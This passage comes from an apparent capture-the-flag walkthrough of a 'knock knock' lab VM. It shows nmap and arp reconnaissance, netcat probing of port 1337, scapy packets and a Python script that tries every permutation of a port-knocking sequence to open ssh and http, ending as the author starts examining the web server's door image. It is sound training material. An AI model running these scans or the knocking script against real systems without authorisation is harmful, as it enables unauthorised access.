</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 09:51 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.1
</span><span class='line'>Host is up <span class="o">(</span>0.000030s latency<span class="o">)</span>.
</span><span class='line'>All 1000 scanned ports on 192.168.56.1 are closed <span class="o">(</span>936<span class="o">)</span> or open<span class="p">|</span>filtered <span class="o">(</span>64<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>1 host up<span class="o">)</span> scanned in 14.99 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Only the gateway was alive. A <code>arp -a</code> however spilled some of the beans:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>arp -i vboxnet0 -a
</span><span class='line'>? <span class="o">(</span>192.168.56.0<span class="o">)</span> at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.1<span class="o">)</span> at a:0:27:0:0:0 on vboxnet0 ifscope permanent <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.2<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>? <span class="o">(</span>192.168.56.201<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.202<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.203<span class="o">)</span> at 8:0:27:be:dd:c8 on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.204<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.205<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>? <span class="o">(</span>192.168.56.255<span class="o">)</span> at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Hello <code>.203</code>! Pinging 192.168.56.203 responded with Destination Port Unreachable messages:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ping -c 2 192.168.56.203
</span><span class='line'>PING 192.168.56.203 <span class="o">(</span>192.168.56.203<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
</span><span class='line'>From 192.168.56.203 <span class="nv">icmp_seq</span><span class="o">=</span>1 Destination Port Unreachable
</span><span class='line'>From 192.168.56.203 <span class="nv">icmp_seq</span><span class="o">=</span>2 Destination Port Unreachable
</span><span class='line'>
</span><span class='line'>--- 192.168.56.203 ping statistics ---
</span><span class='line'>2 packets transmitted, 0 received, +2 errors, 100% packet loss, <span class="nb">time </span>999ms
</span></code></pre></td></tr></table></div></figure>


<p>While a little confusing at first, I figured the firewall was to blame here. I proceeded to focus my attention on this IP and did a normal <code>nmap</code> scan:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sV --reason 192.168.56.203 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 10:03 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0016s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 65534 filtered ports
</span><span class='line'>Reason: 65534 no-responses
</span><span class='line'>PORT     STATE SERVICE REASON  VERSION
</span><span class='line'>1337/tcp open  waste?  syn-ack
</span><span class='line'>
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
</span><span class='line'>SF-Port1337-TCP:V<span class="o">=</span>6.46%I<span class="o">=</span>7%D<span class="o">=</span>10/14%Time<span class="o">=</span>543CEE50%P<span class="o">=</span>i686-pc-linux-gnu%r<span class="o">(</span>NUL
</span><span class='line'>SF:L,15,<span class="s2">&quot;\[12247,\x202759,\x2026802\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,15,<span class="s2">&quot;\[37866,\x202</span>
</span><span class='line'><span class="s2">SF:9242,\x203904\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,15,<span class="s2">&quot;\[29185,\x207368,\x2028937\]\n&quot;</span><span class="o">)</span>%r
</span><span class='line'>SF:<span class="o">(</span>HTTPOptions,15,<span class="s2">&quot;\[55772,\x205315,\x2050180\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,13,<span class="s2">&quot;\[9</span>
</span><span class='line'><span class="s2">SF:301,\x2026341,\x20574\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,16,<span class="s2">&quot;\[34002,\x2046353,\x2023995\</span>
</span><span class='line'><span class="s2">SF:]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReq,16,<span class="s2">&quot;\[47043,\x2037532,\x2024012\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSSt
</span><span class='line'>SF:atusRequest,15,<span class="s2">&quot;\[31914,\x208919,\x2027965\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>Help,15,<span class="s2">&quot;\[63865,\x2</span>
</span><span class='line'><span class="s2">SF:07077,\x2055801\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,15,<span class="s2">&quot;\[30406,\x208520,\x2047713\]\</span>
</span><span class='line'><span class="s2">SF:n&quot;</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,16,<span class="s2">&quot;\[10459,\x2050977,\x2063996\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,16,<span class="s2">&quot;\</span>
</span><span class='line'><span class="s2">SF:[61080,\x2038407,\x2048416\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,15,<span class="s2">&quot;\[61127,\x2058212,\x203</span>
</span><span class='line'><span class="s2">SF:856\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,16,<span class="s2">&quot;\[11007,\x2051452,\x2038765\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>L
</span><span class='line'>SF:PDString,15,<span class="s2">&quot;\[5738,\x2063719,\x2026394\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>LDAPBindReq,14,<span class="s2">&quot;\[14292</span>
</span><span class='line'><span class="s2">SF:,\x20937,\x2020668\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,16,<span class="s2">&quot;\[33684,\x2058491,\x2031373\]</span>
</span><span class='line'><span class="s2">SF:\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>LANDesk-RC,16,<span class="s2">&quot;\[58946,\x2030941,\x2053345\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServe
</span><span class='line'>SF:r,15,<span class="s2">&quot;\[6672,\x2031370,\x2053882\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>NCP,16,<span class="s2">&quot;\[15356,\x2041972,\x20</span>
</span><span class='line'><span class="s2">SF:52087\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>NotesRPC,16,<span class="s2">&quot;\[51444,\x2044303,\x2013901\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>WMSReque
</span><span class='line'>SF:st,13,<span class="s2">&quot;\[87,\x2044952,\x2060309\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>oracle-tns,15,<span class="s2">&quot;\[51073,\x204686</span>
</span><span class='line'><span class="s2">SF:0,\x206777\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>afp,16,<span class="s2">&quot;\[30287,\x2064026,\x2029364\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>kumo-ser
</span><span class='line'>SF:ver,14,<span class="s2">&quot;\[17824,\x2048485,\x20579\]\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 5521.11 seconds
</span></code></pre></td></tr></table></div></figure>


<h2>knock knock&hellip;</h2>

<p><code>tcp/1337</code> was the only open port on the machine. I promptly connected to it to see what we have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -vn 192.168.56.203 1337
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.203<span class="o">]</span> 1337 <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'><span class="o">[</span>6605, 29872, 38566<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>root@kali:~# nc -vn 192.168.56.203 1337
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.203<span class="o">]</span> 1337 <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'><span class="o">[</span>43059, 22435, 17432<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Interesting. Each connection returns a list of numbers. At this stage I should mention that the name of the VM, together with the list of 3 numbers (which look like port numbers as they are always below 65535) had me think that this had to be the sequence in which we have to knock ports to open others.</p>

<p><a href="http://en.wikipedia.org/wiki/Port_knocking">Port knocking</a> generally means that we send a sequence of packets on specific ports so that the listener may perform a certain action when the correct sequence has been &lsquo;knocked&rsquo;. Think of it literally as if someone knocks 3 times at your door and you open up. The only thing is the 3 knocks have to be in a specific order, and if they are not, you will generally ignore the person at the door. It&rsquo;s also important to note that you will also not react to say a single knock. Only those 3 specific ones.</p>

<p>There are plenty of implementations of port knocking out there. My personal favorite being <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> by <a href="https://twitter.com/moxie">@moxie</a>. I have previously played with this implementation and its pretty sweet. A crypted packet is sent to a machine that is logging firewall drops. <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> tails the <code>kern.log</code> and reacts on the correct sequences.</p>

<p>This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.</p>

<h2>&hellip;whos there?</h2>

<p>So with the <code>tcp/1337</code> service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using <code>nmap</code> to scan them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="k">for </span>PORT in 43059 22435 17432<span class="p">;</span> <span class="k">do </span>nmap -PN 192.168.56.203 -p <span class="nv">$PORT</span><span class="p">;</span> <span class="k">done</span>
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:25 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up.
</span><span class='line'>PORT      STATE    SERVICE
</span><span class='line'>43059/tcp filtered unknown
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 2.06 seconds
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:25 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up.
</span><span class='line'>PORT      STATE    SERVICE
</span><span class='line'>22435/tcp filtered unknown
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 2.13 seconds
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:25 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up.
</span><span class='line'>PORT      STATE    SERVICE
</span><span class='line'>17432/tcp filtered unknown
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 2.07 seconds
</span></code></pre></td></tr></table></div></figure>


<p>With that done, I rescanned the box for any new open ports but nothing was different. I retried the <code>nmap</code> loop just to make sure, but it did not appear to make a difference.</p>

<p>Remembering that the sequence changed every time you connected to the <code>tcp/1337</code> service, I figured it may change some configuration on the server to accept a new sequence. So, I re-connected to the <code>tcp/1337</code> service, and looped over the new sequence. Still, nothing. At this stage a was starting to feel relatively lost as to what may be happening. I returned to doing some research on some implementations of this knock knock concept and came across <a href="https://github.com/jvinet/knock">knockd</a>. I downloaded the <a href="https://github.com/jvinet/knock/blob/master/src/knock.c">client</a> and compiled locally with <code>gcc knock.c -o knock</code> and tested to see if this makes any difference.</p>

<p>Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.</p>

<h2>22 and 80 too</h2>

<p>The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the <code>tcp/1337</code> service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt;&gt;&gt; <span class="nv">ip</span><span class="o">=</span>IP<span class="o">(</span><span class="nv">dst</span><span class="o">=</span><span class="s2">&quot;192.168.56.203&quot;</span><span class="o">)</span>
</span><span class='line'>&gt;&gt;&gt; <span class="nv">SYN</span><span class="o">=</span>TCP<span class="o">(</span><span class="nv">dport</span><span class="o">=</span>40508,flags<span class="o">=</span><span class="s2">&quot;S&quot;</span><span class="o">)</span>
</span><span class='line'>&gt;&gt;&gt; send<span class="o">(</span>ip/SYN<span class="o">)</span>
</span><span class='line'>.
</span><span class='line'>Sent 1 packets.
</span><span class='line'>&gt;&gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>After quite some time, suddenly, nmap reports <code>tcp/22</code> and <code>tcp/80</code> as open&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.203
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:40 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 998 filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>80/tcp open  http
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 4.98 seconds
</span></code></pre></td></tr></table></div></figure>


<p><strong>W.T.F.</strong> I actually had no idea why this worked. I had some theories, but based on the amount of testing I did, I figured that I effectively brute-forced my way in.</p>

<p>With the ports now open, I did shuffle some ideas with a few people, and it came out the the sequence may be randomized. With that in mind, I decided to slap together a python script that will try all of the possible sequences and knock all of them, hoping that one of them is eventually the correct one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">destination</span> <span class="o">=</span> <span class="s">&quot;192.168.56.203&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">clean_up_ports</span><span class="p">(</span><span class="n">raw_string</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot; Clean up the raw string received on the socket&quot;&quot;&quot;</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw_string</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">None</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Remove the first [</span>
</span><span class='line'>    <span class="n">raw_string</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;[&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># Remove the second ]</span>
</span><span class='line'>    <span class="n">raw_string</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;]&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># split by commas</span>
</span><span class='line'>    <span class="n">first_list</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># start e empty return list</span>
</span><span class='line'>    <span class="n">ports</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">first_list</span><span class="p">:</span>
</span><span class='line'>        <span class="c"># strip the whitespace around the string</span>
</span><span class='line'>        <span class="c"># and cast to a integer</span>
</span><span class='line'>        <span class="n">ports</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span>  <span class="n">ports</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Getting sequence&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">destination</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>
</span><span class='line'>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Unable to connect to </span><span class="si">%s</span><span class="s"> on port 1337. </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">destination</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># receive the list</span>
</span><span class='line'>    <span class="n">raw_list</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># get the ports in a actual python list</span>
</span><span class='line'>    <span class="n">ports</span> <span class="o">=</span> <span class="n">clean_up_ports</span><span class="p">(</span><span class="n">raw_list</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Sequence is </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">ports</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Knocking on the door using all the possible combinations...</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Lets knock all of the possible combinations of the ports list</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">port_list</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Knocking with sequence: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">port_list</span><span class="p">,)</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">port_list</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[+] Knocking on port </span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">destination</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">destination</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Finished sequence knock</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Knock knock opener&quot;</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Done&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this opened the ports every go :)</p>

<p>I know that I could test to see if say <code>tcp/22</code> was open, but I went with the assumption that you don&rsquo;t know what the actual ports are that should be opened, and hence the complete run of all of the permutations.</p>

<h2>may I burn the door now?</h2>

<p>So, focus shifted to the web server at <code>tcp/80</code>. Browsing to the web server presented us with the following:</p>

<p><img src="https://i.imgur.com/5NdJ65y.png"></p>

<p>Any path/file that you browse to will return this exact same picture. Sound familiar? :) This kinda breaks any form of scanning and or enumeration via things like <code>wfuzz</code> etc. With the hint <em>Gotta look harder</em>, I decided to move my attention to the door image itself.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wget http://192.168.56.203/knockknock.jpg
</span><span class='line'>--2014-10-14 13:04:34--  http://192.168.56.203/knockknock.jpg
</span><span class='line'>Connecting to 192.168.56.203:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 84741 <span class="o">(</span>83K<span class="o">)</span> <span class="o">[</span>image/jpeg<span class="o">]</span>
